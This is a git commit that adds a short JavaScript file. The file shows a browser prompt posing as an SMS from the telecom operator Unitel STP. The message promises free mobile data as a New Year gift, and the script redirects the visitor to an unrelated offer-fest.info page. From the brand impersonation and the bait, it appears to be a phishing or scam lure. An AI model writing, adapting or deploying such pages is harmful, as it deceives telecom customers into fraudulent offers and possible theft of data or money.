03eda8fb67f01fae1041cd9891efcc083baec3a9
ekpesense <abantak9@gmail.com>
2025-01-27 01:01:56 -0800

    Create activation-unitel-STP.com.js

---
+++ activation-unitel-STP.com.js
@@ -0,0 +1,5 @@
+var password = 'PRESENTE DE ANO NOVO'
+password=prompt('UNITEL STP SMS: Caro cliente da Unitel STP, receba dados grátis de 5 GB a 100 GB, recompensa para clientes de ano novo, Clique PRESENTE DE ANO NOVO Para verificar agora ','PRESENTE DE ANO NOVO');
+if (password != 'PRESENTE DE ANO NOVO') {
+location.href='https://offer-fest.info/unitel-STP.com.html';
+}
